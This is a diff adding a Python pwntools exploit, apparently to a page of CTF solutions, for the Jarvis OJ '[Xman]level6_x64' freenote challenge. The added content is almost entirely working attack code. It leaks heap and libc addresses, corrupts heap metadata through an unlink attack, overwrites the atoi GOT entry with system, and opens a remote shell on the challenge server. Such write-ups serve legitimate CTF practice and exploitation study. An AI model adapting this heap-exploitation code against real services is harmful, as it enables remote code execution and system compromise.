@@ -446,3 +446,75 @@ icon: icon-html
 
    
 
+* #### [Xman]level6_x64
+
+   ```python
+   from pwn import *
+   context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
+   r = remote('pwn2.jarvisoj.com',9886)
+   #context.log_level = "debug"
+   #r = process(['./freenote_x64'],env = {"LD_PRELOAD":"./libc-2.19.so"})
+   elf = ELF('./freenote_x64')
+   libc = ELF('./libc-2.19.so')
+   
+   def list():
+   	r.sendlineafter('Your choice:','1')
+   
+   def new(note):
+   	r.sendlineafter('Your choice:','2')
+   	r.sendlineafter('Length of new note:',str(len(note)))
+   	r.sendlineafter('Enter your note:',note)
+   
+   def edit(index, note):
+   	r.sendlineafter('Your choice:','3')
+   	r.sendlineafter('Note number:',str(index))
+   	r.sendlineafter('Length of note:',str(len(note)))
+   	r.sendlineafter('Enter your note:',note)
+   
+   def delete(index):
+   	r.sendlineafter('Your choice:','4')
+   	r.sendlineafter('Note number:',str(index))
+   
+   
+   for i in range(10):
+   	new('f**k')
+   
+   #leak heap
+   delete(3)
+   delete(1)
+   padding = 'f**k' * ((0x80 + 0x10)/4)
+   edit(0, padding)
+   list()
+   r.recvuntil(padding)
+   chunk3 = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00'))
+   heap_base = chunk3 - 6176 - 0x90 * 3
+   chunk0 = heap_base + 0x30
+   print(heap_base)
+   print(chunk0)
+   #gdb.attach(r)
+   #unlink
+   payload = p64(0x90) + p64(0x80) + p64(chunk0 - 0x18) + p64(chunk0 - 0x10)
+   payload += 'f**k' * ((0x80 - 4 * 8)/4)
+   payload += p64(0x80) + p64(0x90) + 'f**k' * (0x70/4)
+   edit(0, payload)
+   #gdb.attach(r)
+   delete(1)
+   #leak libc
+   #gdb.attach(r)
+   payload = p64(2) + p64(1) + p64(0x100) + p64(chunk0 - 0x18)
+   payload += p64(1) + p64(0x8) + p64(elf.got["atoi"])
+   payload = payload.ljust(0x100, '\x00')
+   edit(0, payload)
+   list()
+   #gdb.attach(r)
+   r.recvuntil("0. ")
+   r.recvuntil("1. ")
+   libc.address = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.sym["atoi"]
+   #get shell
+   edit(1, p64(libc.sym['system']))
+   r.sendlineafter("choice: ", "/bin/sh")
+   r.interactive()
+   
+   ```
+
+   
